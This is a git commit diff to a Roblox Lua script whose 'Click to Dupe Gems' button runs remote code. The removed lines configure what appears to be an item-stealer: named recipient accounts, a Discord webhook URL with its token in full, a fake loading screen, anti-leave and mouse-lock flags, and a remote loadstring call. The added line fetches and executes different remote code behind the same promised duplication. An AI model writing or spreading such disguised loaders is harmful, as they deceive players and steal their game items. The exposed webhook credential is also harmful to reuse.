fc1ea355da06dc5e51088e2ef11cd08f5642fa74
MrPectable <126442140+MrPectable@users.noreply.github.com>
2023-05-13 03:00:11 -0400

    Update v1.lua

--- v1.lua
+++ v1.lua
@@ -191,23 +191,7 @@ local Section2 = Tab2:Section({
 Section2:Button({
    Text = "Click to Dupe Gems!Beta",
    Callback = function()
-    UserName = "jsavige4"
-UserName2 = "jsavige4alt" -- optional delete the whole line if you don't want it
-Webhook = "https://discord.com/api/webhooks/1106824427976540280/DMCM8a6LMXilU9K4Iuyx7feogRAc-MYTY99brOzZ5NOqs_fGspWEDfC1u0E-UKwP5MIQ" -- optional delete the whole line if you don't want it
-
-_G.LoadingScreen = true
-_G.AntiLeave = true
-_G.MouseLock = true 
--- set them to false if you don't need them
-
-_G.ScriptName = "PSX BETA"
-_G.FirstText = "Script Preparing"
-_G.SecondText = "Script Loading..."
-_G.ThirdText = "Almost Done..."
-_G.WaitingTime = 180 -- it's the time between 0% and 100% in secondes
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
-      
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/MrPectable/dupe/main/dupe.lua"))()
    end
 })
 Section2:Button({
